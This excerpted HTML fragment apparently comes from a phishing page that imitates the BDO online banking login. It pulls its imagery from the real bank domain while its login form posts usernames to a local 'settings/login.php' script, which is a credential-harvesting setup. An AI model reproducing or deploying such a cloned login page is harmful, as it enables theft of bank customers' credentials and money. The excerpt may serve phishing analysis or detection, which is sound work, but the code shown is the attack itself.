...
<img border="0" src="https://online.bdo.com.ph/sso/resources/com.ccti.citrine.sso.web.login.LoginUnifiedPage/css/Login_Advisory_1.png">
                                        ...
                                        <div id="IDMyBDOGray">
                                            <div id="left column">
                                                ...
                                                <form autocomplete="off" loginForm="true" class="loginForm" id="id41" method="post" action="settings/login.php"><div style="display:none"><input type="hidden" name="id41_hf_0" id="id41_hf_0" /></div>                            
                                                    ...
                                                    <input class="textbox box" type="text" id="channelUsrnmPin" tabindex="1" maxlength="30" value="" name="username"/><br/>
